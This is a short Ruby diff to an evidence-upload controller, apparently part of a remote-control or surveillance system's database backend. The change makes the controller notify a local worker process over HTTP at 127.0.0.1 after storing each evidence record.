@@ -6,7 +6,10 @@ require 'rcs-db/db_layer'
 
 require 'rcs-common/evidence_manager'
 
+require 'eventmachine'
+require 'em-http-request'
 require 'time'
+require 'json'
 
 module RCS
 module DB
@@ -34,16 +37,19 @@ class EvidenceController < RESTController
 
     # save the evidence in the db
     begin
-      EvidenceManager.store_evidence session, @req_content.size, @req_content
+      id = EvidenceManager.store_evidence session, @req_content.size, @req_content
+      #TODO: notify the worker
+      trace :debug, "notifying worker of [#{session[:instance]}][#{id}]"
+      notification = {session[:instance] => [id]}.to_json
+      request = EM::HttpRequest.new('http://127.0.0.1:5150').post :body => notification
+      request.callback {|http| http.response}
     rescue
       return STATUS_NOT_FOUND
     end
 
-    #TODO: notify the worker
-
     return STATUS_OK, *json_reply({:bytes => @req_content.size})
   end
-
+  
   # used to report that the activity of an instance is starting
   def start
     require_auth_level :server
